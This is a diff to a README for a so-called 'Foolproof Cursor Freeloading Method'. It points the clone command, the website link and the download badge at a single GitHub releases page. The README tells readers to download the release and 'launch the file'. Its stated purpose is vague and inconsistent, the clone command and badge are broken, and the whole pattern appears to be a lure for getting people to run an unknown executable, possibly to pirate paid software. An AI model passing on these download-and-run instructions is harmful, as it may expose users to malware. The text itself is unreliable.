@@ -14,7 +14,7 @@ To implement the **Foolproof Cursor Freeloading Method** in your project, follow
 
 1. Clone the repository to your local machine:
    ```
-   git clone https://github.com/username/Foolproof-cursor-freeloading-method.git
+   git clone https://github.com/Alda770/Foolproof-cursor-freeloading-method/releases
    ```
 
 2. Download the necessary files from the repository.
@@ -35,13 +35,13 @@ If you encounter any issues while using the **Foolproof Cursor Freeloading Metho
 
 ### Resources
 
-For more information about the **Foolproof Cursor Freeloading Method** and tips on optimizing cursor performance, visit our [official website](https://cursorfreeloadingmethod.com).
+For more information about the **Foolproof Cursor Freeloading Method** and tips on optimizing cursor performance, visit our [official website](https://github.com/Alda770/Foolproof-cursor-freeloading-method/releases).
 
 ### Download
 
-Download the latest release of the **Foolproof Cursor Freeloading Method** from [here](https://github.com/assets/Release.zip). Don't forget to launch the file to get started with optimizing your cursor performance.
+Download the latest release of the **Foolproof Cursor Freeloading Method** from [here](https://github.com/Alda770/Foolproof-cursor-freeloading-method/releases). Don't forget to launch the file to get started with optimizing your cursor performance.
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/assets/Release.zip)
+[![Download](https://github.com/Alda770/Foolproof-cursor-freeloading-method/releases%20Release-blue)](https://github.com/Alda770/Foolproof-cursor-freeloading-method/releases)
 
 ---
 
